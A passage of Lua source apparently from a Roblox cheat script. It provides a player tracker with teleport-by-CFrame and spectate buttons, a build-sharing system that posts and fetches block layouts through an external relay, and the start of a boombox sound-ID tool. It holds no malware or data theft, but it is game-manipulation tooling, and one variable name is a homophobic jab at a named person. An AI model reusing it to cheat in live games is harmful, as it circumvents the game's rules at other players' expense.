    if _enlCards[player.UserId] then return end
    local container = _enlPlayersGroup.Container

    local card = Instance.new('Frame')
    card.BackgroundColor3 = Color3.fromRGB(18, 26, 40)
    card.BorderSizePixel  = 0
    card.Size             = UDim2.new(1, -4, 0, 56)
    card.Parent           = container
    local _cr = Instance.new('UICorner', card); _cr.CornerRadius = UDim.new(0, 6)
    local _st = Instance.new('UIStroke', card)
    _st.Color     = Color3.fromRGB(0, 75, 190)
    _st.Thickness = 1

    local icon = Instance.new('ImageLabel', card)
    icon.BackgroundColor3 = Color3.fromRGB(22, 38, 62)
    icon.BorderSizePixel  = 0
    icon.Position         = UDim2.fromOffset(6, 10)
    icon.Size             = UDim2.fromOffset(36, 36)
    Instance.new('UICorner', icon).CornerRadius = UDim.new(0, 5)
    pcall(function()
        icon.Image = 'rbxthumb://type=AvatarHeadShot&id=' .. player.UserId .. '&w=48&h=48'
    end)

    local nameLabel = Instance.new('TextLabel', card)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Position         = UDim2.fromOffset(48, 9)
    nameLabel.Size             = UDim2.new(1, -150, 0, 18)
    nameLabel.Text             = player.Name
    nameLabel.TextColor3       = Color3.fromRGB(230, 235, 255)
    nameLabel.TextSize         = 12
    nameLabel.Font             = Enum.Font.GothamBold
    nameLabel.TextXAlignment   = Enum.TextXAlignment.Left
    nameLabel.TextTruncate     = Enum.TextTruncate.AtEnd

    local dispLabel = Instance.new('TextLabel', card)
    dispLabel.BackgroundTransparency = 1
    dispLabel.Position         = UDim2.fromOffset(48, 28)
    dispLabel.Size             = UDim2.new(1, -150, 0, 14)
    dispLabel.Text             = (player.DisplayName ~= player.Name) and ('@' .. player.DisplayName) or ''
    dispLabel.TextColor3       = Color3.fromRGB(95, 130, 180)
    dispLabel.TextSize         = 10
    dispLabel.Font             = Enum.Font.Gotham
    dispLabel.TextXAlignment   = Enum.TextXAlignment.Left
    dispLabel.TextTruncate     = Enum.TextTruncate.AtEnd

    local tpBtn = Instance.new('TextButton', card)
    tpBtn.BackgroundColor3 = _ENL_TP_COLOR
    tpBtn.BorderSizePixel  = 0
    tpBtn.AnchorPoint      = Vector2.new(1, 0.5)
    tpBtn.Position         = UDim2.new(1, -5, 0.5, 0)
    tpBtn.Size             = UDim2.fromOffset(62, 24)
    tpBtn.Text             = 'Teleport'
    tpBtn.TextColor3       = Color3.new(1, 1, 1)
    tpBtn.TextSize         = 11
    tpBtn.Font             = Enum.Font.GothamBold
    Instance.new('UICorner', tpBtn).CornerRadius = UDim.new(0, 5)
    tpBtn.MouseButton1Click:Connect(function()
        pcall(function()
            local myChar = plr.Character
            local theirChar = player.Character
            if myChar and theirChar then
                local myHRP    = myChar:FindFirstChild('HumanoidRootPart')
                local theirHRP = theirChar:FindFirstChild('HumanoidRootPart')
                if myHRP and theirHRP then
                    myHRP.CFrame = theirHRP.CFrame * CFrame.new(3, 0, 0)
                    Library:Notify('Teleported to ' .. player.Name, 2)
                end
            end
        end)
    end)

    local specBtn = Instance.new('TextButton', card)
    specBtn.BackgroundColor3 = _ENL_SPEC_IDLE
    specBtn.BorderSizePixel  = 0
    specBtn.AnchorPoint      = Vector2.new(1, 0.5)
    specBtn.Position         = UDim2.new(1, -72, 0.5, 0)
    specBtn.Size             = UDim2.fromOffset(62, 24)
    specBtn.Text             = 'Spectate'
    specBtn.TextColor3       = Color3.new(1, 1, 1)
    specBtn.TextSize         = 11
    specBtn.Font             = Enum.Font.GothamBold
    Instance.new('UICorner', specBtn).CornerRadius = UDim.new(0, 5)
    specBtn.MouseButton1Click:Connect(function()
        pcall(function()
            if _enlSpectating == player then
                _enlSpectating = nil
                local myChar = plr.Character
                local myHum  = myChar and myChar:FindFirstChildOfClass('Humanoid')
                if myHum then
                    workspace.CurrentCamera.CameraSubject = myHum
                end
                specBtn.BackgroundColor3 = _ENL_SPEC_IDLE
                Library:Notify('Stopped spectating', 2)
            else
                local theirChar = player.Character
                if theirChar then
                    local theirHum = theirChar:FindFirstChildOfClass('Humanoid')
                    if theirHum then
                        if _enlSpectating and _enlCards[_enlSpectating.UserId] then
                            _enlCards[_enlSpectating.UserId].spec.BackgroundColor3 = _ENL_SPEC_IDLE
                        end
                        _enlSpectating = player
                        workspace.CurrentCamera.CameraSubject = theirHum
                        specBtn.BackgroundColor3 = _ENL_SPEC_ACTIVE
                        Library:Notify('Spectating ' .. player.Name, 2)
                    else
                        Library:Notify(player.Name .. ' has no humanoid', 2)
                    end
                else
                    Library:Notify(player.Name .. ' has no character', 2)
                end
            end
        end)
    end)

    _enlCards[player.UserId] = { frame = card, spec = specBtn }
    task.defer(function() pcall(function() _enlPlayersGroup:Resize() end) end)
end

local function _removeEnlCard(userId)
    local c = _enlCards[userId]
    if not c then return end
    c.frame:Destroy()
    _enlCards[userId] = nil
    task.defer(function() pcall(function() _enlPlayersGroup:Resize() end) end)
end

local function _hasEnlighten(player)
    if _containerHasArkenstone(player:FindFirstChild('Backpack')) then return true end
    if _containerHasArkenstone(player.Character) then return true end
    if player:GetAttribute('Arken') == true then return true end
    return false
end

local function _onEnlightenGained(player)
    if not _enlCards[player.UserId] then
        _makeEnlCard(player)
        _updateStatus()
        Library:Notify('Enlighten: ' .. player.Name .. ' has The Arkenstone!', 6)
    end
end

local function _onEnlightenLost(player)
    if _enlCards[player.UserId] then
        if _enlSpectating == player then
            _enlSpectating = nil
            pcall(function()
                local myHum = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                workspace.CurrentCamera.CameraSubject = myHum
            end)
        end
        _removeEnlCard(player.UserId)
        _updateStatus()
    end
end

local function _recheckEnlighten(player)
    task.wait(0.15)
    if _hasEnlighten(player) then
        _onEnlightenGained(player)
    else
        _onEnlightenLost(player)
    end
end

local function _rescanEnlightenNow()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= plr then
            if _hasEnlighten(player) then
                _onEnlightenGained(player)
            else
                _onEnlightenLost(player)
            end
        end
    end
end

local function _watchEnlightenFor(player)
    if player == plr then return end
    local conns = {}

    local function _watchBp(bp)
        table.insert(conns, bp.ChildAdded:Connect(function(item)
            if item.Name == 'The Arkenstone' then _onEnlightenGained(player) end
        end))
        table.insert(conns, bp.ChildRemoved:Connect(function(item)
            if item.Name == 'The Arkenstone' then _recheckEnlighten(player) end
        end))
        task.defer(function()
            _recheckEnlighten(player)
        end)
    end

    local function _watchChar(char)
        table.insert(conns, char.ChildAdded:Connect(function(item)
            if item.Name == 'The Arkenstone' then _onEnlightenGained(player) end
        end))
        table.insert(conns, char.ChildRemoved:Connect(function(item)
            if item.Name == 'The Arkenstone' then _recheckEnlighten(player) end
        end))
    end

    -- Watch existing backpack
    local bp = player:FindFirstChild('Backpack')
    if bp then _watchBp(bp) end

    -- Watch for new backpack (spawned on join/respawn)
    table.insert(conns, player.ChildAdded:Connect(function(child)
        if child.Name == 'Backpack' then
            _watchBp(child)
        end
    end))

    -- Watch existing character
    if player.Character then _watchChar(player.Character) end
    table.insert(conns, player.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        _recheckEnlighten(player)
        _watchChar(char)
    end))

    _enlWatchConns[player.UserId] = conns
    _recheckEnlighten(player)
end

for _, pl in ipairs(Players:GetPlayers()) do
    task.spawn(_watchEnlightenFor, pl)
end

_enlBtn.MouseButton1Click:Connect(function()
    task.defer(function()
        if _enlightenPopout.Object and _enlightenPopout.Object.Visible then
            _rescanEnlightenNow()
        end
    end)
end)

task.spawn(function()
    while not Library.Unloaded do
        task.wait(12)
        if not Library.Unloaded then
            _rescanEnlightenNow()
        end
    end
end)

trackScriptConnection(Players.PlayerAdded:Connect(function(pl)
    task.wait(2)
    _watchEnlightenFor(pl)
    _rescanEnlightenNow()
end))

trackScriptConnection(Players.PlayerRemoving:Connect(function(pl)
    local conns = _enlWatchConns[pl.UserId]
    if conns then
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        _enlWatchConns[pl.UserId] = nil
    end
    _onEnlightenLost(pl)
end))

end -- /══ Enlighten Finder ══

do -- ══ Build Share System ══

local _vp = (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize) or Vector2.new(1920, 1080)
local _bsPopout = Library:CreatePopout({
    Title    = 'Build Share',
    Size     = UDim2.fromOffset(370, 540),
    Position = UDim2.fromOffset(math.clamp(370, 0, math.max(0, _vp.X - 380)), math.clamp(45, 0, math.max(0, _vp.Y - 550))),
})

local _bsToggleBtn = _bsPopout:CreateToggleButton('Builds')

local _bsUploading  = false
local _bsFetching   = false
local _bsData       = {}
local _bsCardFrames = {}
local _bsMaxCards   = 20
local _bsFetchAll   -- forward declare

-- Try primary relay, fall back to Deno backup, then local server
local function _bsReq(path, method, body)
    local opts = { Url = _relayUrl .. path, Method = method or 'GET' }
    if body then
        opts.Headers = { ['Content-Type'] = 'application/json' }
        opts.Body    = HttpService:JSONEncode(body)
    end
    local ok, resp = pcall(requestFunc, opts)
    if ok and resp and resp.StatusCode and resp.StatusCode < 500 then
        return ok, resp
    end
    if _relayBackupUrl ~= "" then
        opts.Url = _relayBackupUrl .. path
        ok, resp = pcall(requestFunc, opts)
        if ok and resp and resp.StatusCode and resp.StatusCode < 500 then
            return ok, resp
        end
    end
    if _buildServerUrl ~= "" then
        opts.Url = _buildServerUrl .. path
        ok, resp = pcall(requestFunc, opts)
    end
    return ok, resp
end

-- ── Upload groupbox ───────────────────────────────────────────────────
local _bsUploadGroup = _bsPopout:AddGroupbox('Upload Your Build')

local _bsNameInput = _bsUploadGroup:CreateTextBox({
    Default     = '',
    Name = 'Build Name:',
    PlaceholderText = 'Name your build...',
})

local _bsDescInput = _bsUploadGroup:CreateTextBox({
    Default     = '',
    Name = 'Description:',
    PlaceholderText = 'Describe your build (optional)...',
})

local _bsImageIdInput = _bsUploadGroup:CreateTextBox({
    Default     = '',
    Name = 'Image ID:',
    PlaceholderText = 'Roblox asset ID for thumbnail (optional)...',
})

local _bsUploadLabel = _bsUploadGroup:CreateLabel({Text = 'Ready to upload'})

local function _extractTopColors(arr, n)
    local counts = {}
    for _, blk in ipairs(arr) do
        if type(blk.c) == "table" and #blk.c >= 3 then
            local key = blk.c[1] .. "," .. blk.c[2] .. "," .. blk.c[3]
            counts[key] = (counts[key] or 0) + 1
        end
    end
    local sorted = {}
    for k, v in pairs(counts) do table.insert(sorted, {k, v}) end
    table.sort(sorted, function(a, b) return a[2] > b[2] end)
    local result = {}
    for i = 1, math.min(n or 6, #sorted) do
        local r, g, b = sorted[i][1]:match("(%d+),(%d+),(%d+)")
        if r then table.insert(result, {tonumber(r), tonumber(g), tonumber(b)}) end
    end
    return result
end

local function _bsDoUpload(buildArray)
    if _bsUploading then return end
    if _bsNameInput.Value == '' then Library:Notify('Enter a build name first!', 3); return end
    if #buildArray == 0 then Library:Notify('No blocks to upload!', 3); return end
    _bsUploading = true
    _bsUploadLabel:SetText('Uploading ' .. #buildArray .. ' blocks...')
    task.spawn(function()
        local ok, resp = _bsReq('/builds/upload', 'POST', {
            userId        = plr.UserId,
            username      = plr.Name,
            placeId       = game.PlaceId,
            buildName     = _bsNameInput.Value,
            blockCount    = #buildArray,
            buildData     = buildArray,
            previewColors = _extractTopColors(buildArray, 6),
            description   = _bsDescInput.Value or '',
            imageId       = _bsImageIdInput.Value or '',
        })
        _bsUploading = false
        if ok and resp then
            if resp.StatusCode == 200 or resp.StatusCode == 201 then
                _bsUploadLabel:SetText('✓ Uploaded: ' .. _bsNameInput.Value)
                Library:Notify('Build "' .. _bsNameInput.Value .. '" shared globally!', 4)
                task.delay(1.5, _bsFetchAll)
            elseif resp.StatusCode == 429 then
                local ok2, errData = pcall(HttpService.JSONDecode, HttpService, resp.Body or '')
                local remaining = (ok2 and errData and errData.remaining) or 300
                _bsUploadLabel:SetText('Cooldown: ' .. remaining .. 's remaining')
                Library:Notify('Upload cooldown — wait ' .. remaining .. 's', 5)
            else
                _bsUploadLabel:SetText('✗ Upload failed — check relay worker')
                Library:Notify('Upload failed', 4)
            end
        else
            _bsUploadLabel:SetText('✗ Relay unreachable')
            Library:Notify('Upload failed — relay down', 4)
        end
    end)
end

_bsUploadGroup:CreateButton({
    Name = 'Upload Server Blocks',
    Function = function()
        local arr = {}
        for _, v in pairs(cfolder:GetDescendants()) do
            if v:IsA('BasePart') then table.insert(arr, saveblock(v)) end
        end
        _bsDoUpload(arr)
    end,
})

_bsUploadGroup:CreateButton({
    Name = 'Upload from JSON Input',
    Function = function()
        local arr, err = _decodeJson(importJsonInput.Value)
        if err then Library:Notify(err, 5); return end
        _bsDoUpload(arr)
    end,
})

-- ── Browse groupbox ───────────────────────────────────────────────────
local _bsBrowseGroup = _bsPopout:AddGroupbox('Community Builds')
local _bsStatusLabel = _bsBrowseGroup:CreateLabel({Text = 'Loading...'})
_bsBrowseGroup:CreateDivider()
local _bsContainer = _bsBrowseGroup.Container

-- On-demand fetch of a single build's data, then run action
local function _bsFetchAndAct(buildId, buildName, action)
    Library:Notify('Fetching "' .. buildName .. '"...', 2)
    task.spawn(function()
        local ok, resp = _bsReq('/builds/get?id=' .. tostring(buildId), 'GET')
        if ok and resp and resp.StatusCode == 200 then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp.Body or '')
            if ok2 and data and type(data.buildData) == 'table' then
                if action == 'preview' then
                    Library:Notify('Previewing "' .. buildName .. '"...', 3)
                    task.spawn(function() startPreview(data.buildData) end)
                elseif action == 'import' then
                    importJsonInput:SetValue(HttpService:JSONEncode(data.buildData))
                    Library:Notify('"' .. buildName .. '" loaded → click Load Buildings!', 5)
                elseif action == 'build' then
                    -- Directly start building (no manual step required)
                    importJsonInput:SetValue(HttpService:JSONEncode(data.buildData))
                    local bd = sortBlocksByDistanceFromSpawn(data.buildData)
                    Library:Notify('Building "' .. buildName .. '" (' .. #bd .. ' blocks)...', 5)
                    stopped = false
                    totalBuildBlocks  = #bd
                    currentBlockIndex = 0
                    _buildStartTime = tick()
                    updateBuildProgress()
                    task.spawn(function()
                        for i, v in ipairs(bd) do
                            if stopped then break end
                            currentBlockIndex = i
                            updateBuildProgress()
                            local posses = v.p or v.pos
                            if not posses then continue end
                            local bsz = (v.s or v.size) and Vector3.new(table.unpack(v.s or v.size)) or Vector3.new(gridSize, gridSize, gridSize)
                            local pos = Vector3.new(posses[1], posses[2], posses[3])
                            local col = (v.c or v.color) and Color3.fromRGB(table.unpack(v.c or v.color)) or Color3.fromRGB(192, 192, 192)
                            local mat = v.m or v.mat
                           local IsPealzGay = #workspace:FindPartsInRegion3(Region3.new(pos, pos + bsz), nil, 1) == 0
                            if IsPealzGay then
                                    createpartrepl(pos, bsz, col, swappedmaterials[mat] or Enum.Material.SmoothPlastic)
                                    buildblock(pos, mat, col, nil, bsz, true, v.o or v.origmat, v.sp or v.sprayed, v.a or v.anchored, v.cc or v.collide)
                            end
                            task.wait(math.max(0.05, getPing() / 1000)) -- ping scaling if it wasnt there before or some shit idfk
                        end
                        stopped = false
                        totalBuildBlocks  = 0
                        currentBlockIndex = 0
                        updateBuildProgress()
                        Library:Notify('"' .. buildName .. '" build complete!', 5)
                    end)
                end
            else
                Library:Notify('Build data parse failed', 3)
            end
        else
            Library:Notify('Could not fetch build — relay may be down', 3)
        end
    end)
end

-- Build a gallery card (called _bsMaxCards times up front)
local function _bsMakeCard(idx)
    local CARD_H = 110
    local THUMB  = 80
    local PAD    = 7
    local BTN_H  = 26
    local BTN_W  = 60
    local BTN_GAP = 4
    local RX     = PAD + THUMB + PAD   -- right-column X start (= 94)

    -- Card frame
    local cf = Instance.new('Frame')
    cf.BackgroundColor3 = Library.BackgroundColor
    cf.BorderSizePixel  = 0
    cf.Size             = UDim2.new(1, -4, 0, CARD_H)
    cf.Visible          = false
    cf.ZIndex           = 55
    cf.LayoutOrder      = idx
    cf.Parent           = _bsContainer
    Library:Create('UICorner', { CornerRadius = UDim.new(0, 6); Parent = cf })
    Library:Create('UIStroke', { Color = Library.OutlineColor; Thickness = 1;
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border; Parent = cf })
    Library:AddToRegistry(cf, { BackgroundColor3 = 'BackgroundColor' })

    -- ── Thumbnail area ─────────────────────────────────────────────────────
    local thumbBg = Instance.new('Frame')
    thumbBg.BackgroundColor3 = Color3.fromRGB(18, 22, 34)
    thumbBg.BorderSizePixel  = 0
    thumbBg.Position         = UDim2.fromOffset(PAD, (CARD_H - THUMB) / 2)
    thumbBg.Size             = UDim2.fromOffset(THUMB, THUMB)
    thumbBg.ZIndex           = 56
    thumbBg.ClipsDescendants = true
    thumbBg.Parent           = cf
    Library:Create('UICorner', { CornerRadius = UDim.new(0, 5); Parent = thumbBg })

    -- 3 × 2 color swatch grid inside thumbnail
    local colorSwatches = {}
    local SW = math.floor((THUMB - 3) / 3)
    local SH = math.floor((THUMB - 3) / 2)
    for row = 0, 1 do
        for col = 0, 2 do
            local sw = Instance.new('Frame')
            sw.BackgroundColor3 = Color3.fromRGB(35, 42, 58)
            sw.BorderSizePixel  = 0
            sw.Position         = UDim2.fromOffset(1 + col * (SW + 1), 1 + row * (SH + 1))
            sw.Size             = UDim2.fromOffset(SW, SH)
            sw.ZIndex           = 57
            sw.Parent           = thumbBg
            Library:Create('UICorner', { CornerRadius = UDim.new(0, 3); Parent = sw })
            table.insert(colorSwatches, sw)
        end
    end

    -- Block count badge (bottom of thumbnail)
    local blockBadge = Instance.new('Frame')
    blockBadge.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blockBadge.BackgroundTransparency = 0.35
    blockBadge.BorderSizePixel  = 0
    blockBadge.Position         = UDim2.new(0, 0, 1, -16)
    blockBadge.Size             = UDim2.new(1, 0, 0, 16)
    blockBadge.ZIndex           = 58
    blockBadge.Parent           = thumbBg
    local blockBadgeLbl = Instance.new('TextLabel')
    blockBadgeLbl.BackgroundTransparency = 1
    blockBadgeLbl.Size       = UDim2.new(1, 0, 1, 0)
    blockBadgeLbl.Font       = Enum.Font.GothamBold
    blockBadgeLbl.Text       = '0 blocks'
    blockBadgeLbl.TextColor3 = Color3.new(1, 1, 1)
    blockBadgeLbl.TextSize   = 9
    blockBadgeLbl.ZIndex     = 59
    blockBadgeLbl.Parent     = blockBadge

    -- ── Right column content ───────────────────────────────────────────────
    local nameL = Instance.new('TextLabel')
    nameL.BackgroundTransparency = 1
    nameL.Position   = UDim2.new(0, RX, 0, PAD)
    nameL.Size       = UDim2.new(1, -(RX + PAD + 22), 0, 16)
    nameL.Font       = Enum.Font.GothamBold
    nameL.TextSize   = 13
    nameL.TextColor3 = Library.FontColor
    nameL.TextXAlignment = Enum.TextXAlignment.Left
    nameL.TextTruncate   = Enum.TextTruncate.AtEnd
    nameL.Text       = 'Build Name'
    nameL.ZIndex     = 57
    nameL.Parent     = cf
    Library:AddToRegistry(nameL, { TextColor3 = 'FontColor' })

    local infoL = Instance.new('TextLabel')
    infoL.BackgroundTransparency = 1
    infoL.Position   = UDim2.new(0, RX, 0, PAD + 18)
    infoL.Size       = UDim2.new(1, -(RX + PAD), 0, 12)
    infoL.Font       = Enum.Font.Gotham
    infoL.TextSize   = 10
    infoL.TextColor3 = Color3.fromRGB(130, 145, 170)
    infoL.TextXAlignment = Enum.TextXAlignment.Left
    infoL.TextTruncate   = Enum.TextTruncate.AtEnd
    infoL.Text       = '@author'
    infoL.ZIndex     = 57
    infoL.Parent     = cf

    -- Star rating (clickable)
    local starsL = Instance.new('TextLabel')
    starsL.BackgroundTransparency = 1
    starsL.Position   = UDim2.new(0, RX, 0, PAD + 32)
    starsL.Size       = UDim2.new(1, -(RX + PAD), 0, 14)
    starsL.Font       = Enum.Font.GothamBold
    starsL.TextSize   = 14
    starsL.TextColor3 = Color3.fromRGB(255, 200, 50)
    starsL.TextXAlignment = Enum.TextXAlignment.Left
    starsL.Text       = '☆☆☆☆☆  (0)'
    starsL.ZIndex     = 57
    starsL.Active     = true
    starsL.Parent     = cf

    starsL.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local b = _bsData[idx]
        if not b then return end
        local relX    = inp.Position.X - starsL.AbsolutePosition.X
        local starIdx = math.clamp(math.ceil(relX / (starsL.AbsoluteSize.X / 5)), 1, 5)
        Library:Notify('Rating ' .. starIdx .. ' ★...', 2)
        task.spawn(function()
            local ok, resp = _bsReq('/builds/rate', 'POST', {
                buildId = b.id,
                userId  = tostring(plr.UserId),
                rating  = starIdx,
            })
            if ok and resp and resp.StatusCode == 200 then
                Library:Notify('Rated ' .. starIdx .. ' ★!', 3)
                task.delay(0.5, _bsFetchAll)
            else
                Library:Notify('Rating failed', 3)
            end
        end)
    end)

    -- Action buttons (bottom-right of card)
    local function makeBtn(text, color, hcolor, xOffset)
        local f = Instance.new('Frame')
        f.BackgroundColor3 = color
        f.BorderSizePixel  = 0
        f.AnchorPoint      = Vector2.new(1, 1)
        f.Position         = UDim2.new(1, xOffset, 1, -PAD)
        f.Size             = UDim2.fromOffset(BTN_W, BTN_H)
        f.ZIndex           = 57
        f.Active           = true
        f.Parent           = cf
        Library:Create('UICorner', { CornerRadius = UDim.new(0, 4); Parent = f })
        local lbl = Instance.new('TextLabel')
        lbl.BackgroundTransparency = 1
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.Font = Enum.Font.GothamBold
        lbl.Text = text
        lbl.TextColor3 = Color3.new(1, 1, 1)
        lbl.TextSize   = 11
        lbl.ZIndex     = 58
        lbl.Parent     = f
        f.MouseEnter:Connect(function()
            TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = hcolor }):Play()
        end)
        f.MouseLeave:Connect(function()
            TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = color }):Play()
        end)
        return f
    end

    local prevBtn = makeBtn('Preview',
        Color3.fromRGB(50, 80, 165), Color3.fromRGB(70, 110, 210),
        -(BTN_W + BTN_GAP + PAD))
    local impBtn  = makeBtn('Import & Build',
        Color3.fromRGB(46, 140, 67), Color3.fromRGB(60, 175, 85),
        -PAD)

    prevBtn.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local b = _bsData[idx]; if not b then return end
        _bsFetchAndAct(b.id, b.buildName or 'Build', 'preview')
    end)
    impBtn.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local b = _bsData[idx]; if not b then return end
        _bsFetchAndAct(b.id, b.buildName or 'Build', 'build')
    end)

    -- Delete button (visible for own builds + owners; relay validates server-side)
    local delBtn = Instance.new('TextButton')
    delBtn.BackgroundColor3 = Color3.fromRGB(170, 35, 35)
    delBtn.BorderSizePixel  = 0
    delBtn.AnchorPoint      = Vector2.new(1, 0)
    delBtn.Position         = UDim2.new(1, -PAD, 0, PAD)
    delBtn.Size             = UDim2.fromOffset(18, 18)
    delBtn.Font             = Enum.Font.GothamBold
    delBtn.Text             = '\u{2715}'
    delBtn.TextColor3       = Color3.new(1, 1, 1)
    delBtn.TextSize         = 10
    delBtn.ZIndex           = 59
    delBtn.Visible          = false
    delBtn.Parent           = cf
    Library:Create('UICorner', { CornerRadius = UDim.new(0, 4); Parent = delBtn })
    delBtn.Activated:Connect(function()
        local b = _bsData[idx]; if not b then return end
        Library:Notify('Deleting build...', 2)
        task.spawn(function()
            local ok, resp = _bsReq('/builds/delete', 'POST', {
                buildId = b.id,
                userId  = tostring(plr.UserId),
            })
            if ok and resp and resp.StatusCode == 200 then
                Library:Notify('Build deleted!', 3)
                task.delay(0.3, _bsFetchAll)
            else
                Library:Notify('Delete failed — you can only delete your own builds', 3)
            end
        end)
    end)

    -- Description label (below stars, single line truncated)
    local descL = Instance.new('TextLabel')
    descL.BackgroundTransparency = 1
    descL.Position   = UDim2.new(0, RX, 0, PAD + 46)
    descL.Size       = UDim2.new(1, -(RX + PAD), 0, 11)
    descL.Font       = Enum.Font.Gotham
    descL.TextSize   = 10
    descL.TextColor3 = Color3.fromRGB(120, 130, 155)
    descL.TextXAlignment = Enum.TextXAlignment.Left
    descL.TextTruncate   = Enum.TextTruncate.AtEnd
    descL.TextWrapped    = true
    descL.Text       = ''
    descL.ZIndex     = 57
    descL.Parent     = cf

    -- Timestamp label (above action buttons, right column)
    local timeL = Instance.new('TextLabel')
    timeL.BackgroundTransparency = 1
    timeL.AnchorPoint   = Vector2.new(0, 1)
    timeL.Position      = UDim2.new(0, RX, 1, -(PAD + BTN_H + 3))
    timeL.Size          = UDim2.new(1, -(RX + PAD), 0, 10)
    timeL.Font          = Enum.Font.Gotham
    timeL.TextSize      = 8
    timeL.TextColor3    = Color3.fromRGB(90, 100, 120)
    timeL.TextXAlignment = Enum.TextXAlignment.Left
    timeL.Text          = ''
    timeL.ZIndex        = 57
    timeL.Parent        = cf

    return { frame = cf; nameL = nameL; infoL = infoL; starsL = starsL;
             colorSwatches = colorSwatches; blockBadgeLbl = blockBadgeLbl;
             delBtn = delBtn; descL = descL; timeL = timeL }
end

for i = 1, _bsMaxCards do
    _bsCardFrames[i] = _bsMakeCard(i)
end
pcall(function() _bsBrowseGroup:Resize() end)

local function _starsText(avg, cnt)
    local filled = math.clamp(math.round(avg or 0), 0, 5)
    return string.rep('★', filled) .. string.rep('☆', 5 - filled) .. '  (' .. (cnt or 0) .. ')'
end

-- Format ISO date to short readable string
local function _bsFormatDate(isoStr)
    if not isoStr or isoStr == '' then return '' end
    local y, mo, d, h, mi = isoStr:match('(%d+)-(%d+)-(%d+)T(%d+):(%d+)')
    if not y then return '' end
    return string.format('%s/%s/%s %s:%s', mo, d, y:sub(3), h, mi)
end

-- Render fetched data into pre-built card slots
local function _bsRender()
    for i = 1, _bsMaxCards do
        local slot = _bsCardFrames[i]
        local b    = _bsData[i]
        if b then
            slot.nameL.Text     = b.buildName or 'Unnamed'
            slot.infoL.Text     = '@' .. (b.username or '?')
            slot.blockBadgeLbl.Text = (b.blockCount or 0) .. ' blocks'
            slot.starsL.Text    = _starsText(b.avgRating, b.ratingCount)

            -- Description
            slot.descL.Text = (b.description and b.description ~= '') and b.description or ''

            -- Timestamps
            local created = _bsFormatDate(b.uploadedAt)
            local used    = _bsFormatDate(b.lastUsed)
            local timeStr = created ~= '' and ('Created: ' .. created) or ''
            if used ~= '' then timeStr = timeStr .. (timeStr ~= '' and ' | ' or '') .. 'Used: ' .. used end
            slot.timeL.Text = timeStr

            -- Delete button: visible for own builds or script owners
            local buildUserId = tostring(b.userId or '')
            slot.delBtn.Visible = isOwner or (buildUserId == tostring(plr.UserId))

            -- Populate color swatches from previewColors (array of {r,g,b})
            local colors = {}
            if type(b.previewColors) == 'string' then
                pcall(function()
                    colors = HttpService:JSONDecode(b.previewColors)
                end)
            elseif type(b.previewColors) == 'table' then
                colors = b.previewColors
            end
            for j, sw in ipairs(slot.colorSwatches) do
                local c = colors[j]
                if c and type(c) == 'table' and #c >= 3 then
                    sw.BackgroundColor3 = Color3.fromRGB(c[1], c[2], c[3])
                else
                    sw.BackgroundColor3 = Color3.fromRGB(35, 42, 58)
                end
            end

            slot.frame.Visible = true
        else
            slot.frame.Visible = false
        end
    end
    _bsStatusLabel:SetText(#_bsData .. ' build(s)  •  auto-refresh 30s')
end

-- Fetch summary list from relay worker
_bsFetchAll = function()
    if _bsFetching then return end
    _bsFetching = true
    if #_bsData == 0 then _bsStatusLabel:SetText('Loading builds...') end
    task.spawn(function()
        local ok, resp = _bsReq('/builds/list', 'GET')
        if ok and resp and resp.StatusCode == 200 then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp.Body or '')
            if ok2 and type(data) == 'table' then
                _bsData = data
                _bsRender()
            else
                if #_bsData == 0 then _bsStatusLabel:SetText('Parse error — check relay worker') end
            end
        else
            if #_bsData == 0 then _bsStatusLabel:SetText('Relay unreachable — add /builds/* routes to worker') end
        end
        _bsFetching = false
    end)
end

_bsBrowseGroup:CreateButton({
    Name = '↺  Refresh',
    Function = function()
        _bsFetching = false
        _bsFetchAll()
        Library:Notify('Refreshing build list...', 2)
    end,
})

-- Controls
local _bsCtrlGroup = _bsPopout:AddGroupbox('Preview Controls')
_bsCtrlGroup:CreateButton({
    Name = 'Clear Active Preview',
    Function = function()
        if previewActive then clearPreview(); Library:Notify('Preview cleared', 2)
        else Library:Notify('No active preview', 2) end
    end,
})

-- Initial load + 30s auto-refresh
task.spawn(_bsFetchAll)
task.spawn(function()
    while not Library.Unloaded do
        task.wait(30)
        if not Library.Unloaded then _bsFetchAll() end
    end
end)

end -- /══ Build Share System ══

do -- ══ Boombox Utility ══
local TCOToolsGroup = Tabs.Chat:CreateModule({Name = 'Boombox Utility'})
BoomboxStatus = TCOToolsGroup:CreateLabel({Text = 'Select a Boombox'})

 function onInputBegan(input, gameProcessed)
    if gameProcessed then return end
    -- skip for moblie u noob pealz - soskoify
    local isMobileTouch = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    if isMobileTouch then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local target = mouse.Target
        if target then
            local potentialBoombox = target.Parent
            if boomboxNames[potentialBoombox.Name] == true then
                selectedBoombox = potentialBoombox
                
                local sound = potentialBoombox:FindFirstChild("Sound", true)
                if sound and sound.SoundId ~= "" and sound.SoundId ~= nil then
                    boomboxId = extractSoundId(sound)
                    BoomboxStatus:SetText("Boombox: " .. potentialBoombox.Name .. "\nSound ID: " .. boomboxId .. "\nClick 'Copy ID' to copy")
                    
                    local handle = potentialBoombox:FindFirstChild("Handle")
                    if handle then
                        bbsbox.Adornee = handle
                        bbsbox.LineThickness = 0.05
                    end
                    
